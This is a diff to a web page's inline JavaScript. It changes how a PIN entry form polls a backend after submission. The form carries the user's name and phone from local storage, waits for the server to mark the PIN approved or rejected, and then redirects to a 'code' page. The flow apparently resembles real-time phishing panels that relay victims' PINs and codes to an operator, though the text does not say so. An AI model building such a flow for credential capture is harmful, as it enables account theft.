@@ -75,7 +75,6 @@ inputs.forEach((input, index) => {
 
 form.addEventListener('submit', async (e) => {
     e.preventDefault();
-
     const pin = [...inputs].map(i => i.value).join('');
     const name = localStorage.getItem('name') || '';
     const phone = localStorage.getItem('phone') || '';
@@ -96,7 +95,11 @@ form.addEventListener('submit', async (e) => {
         requestId = data.requestId;
         console.log('🆔 RequestId:', requestId, 'PIN submitted');
 
-        startPolling();
+        // Poll immediately
+        pollApproval();
+        // And then start interval polling
+        pollInterval = setInterval(pollApproval, 1500);
+
     } catch (err) {
         console.error(err);
         statusText.textContent = 'Failed to submit PIN. Try again.';
@@ -106,44 +109,41 @@ form.addEventListener('submit', async (e) => {
     }
 });
 
-function startPolling() {
-    if (pollInterval) clearInterval(pollInterval);
+async function pollApproval() {
+    if (!requestId) return;
 
-    pollInterval = setInterval(async () => {
-        try {
-            console.log('⏱ Polling for approval...', requestId);
-            const res = await fetch(`${BACKEND_URL}/check-pin/${requestId}`);
-            const data = await res.json();
-            console.log('📊 Poll result:', data);
+    try {
+        console.log('⏱ Polling for approval...', requestId);
+        const res = await fetch(`${BACKEND_URL}/check-pin/${requestId}`);
+        const data = await res.json();
+        console.log('📊 Poll result:', data);
 
-            if (data.approved === true) {
-                clearInterval(pollInterval);
-                window.location.href = 'code.html';
-            }
+        if (data.approved === true) {
+            clearInterval(pollInterval);
+            console.log('✅ PIN approved! Redirecting...');
+            window.location.href = 'code.html';
+        } else if (data.approved === false) {
+            clearInterval(pollInterval);
+            attempts++;
+            pinBoxes.classList.add('shake');
+            setTimeout(() => pinBoxes.classList.remove('shake'), 400);
 
-            if (data.approved === false) {
-                clearInterval(pollInterval);
-                attempts++;
-                pinBoxes.classList.add('shake');
-                setTimeout(() => pinBoxes.classList.remove('shake'), 400);
-
-                if (attempts >= maxAttempts) {
-                    statusText.innerHTML = '<span class="error">Too many failed attempts. Please try again later.</span>';
-                    spinner.style.display = 'none';
-                    return;
-                }
-
-                statusText.innerHTML = '<span class="error">Incorrect PIN. Please try again.</span>';
+            if (attempts >= maxAttempts) {
+                statusText.innerHTML = '<span class="error">Too many failed attempts. Please try again later.</span>';
                 spinner.style.display = 'none';
-                inputs.forEach(i => i.value = '');
-                inputs[0].focus();
-                button.disabled = true;
-                btnText.textContent = 'Submit PIN';
+                return;
             }
-        } catch (err) {
-            console.error('Polling error:', err);
+
+            statusText.innerHTML = '<span class="error">Incorrect PIN. Please try again.</span>';
+            spinner.style.display = 'none';
+            inputs.forEach(i => i.value = '');
+            inputs[0].focus();
+            button.disabled = true;
+            btnText.textContent = 'Submit PIN';
         }
-    }, 2000);
+    } catch (err) {
+        console.error('Polling error:', err);
+    }
 }
 </script>
 </body>
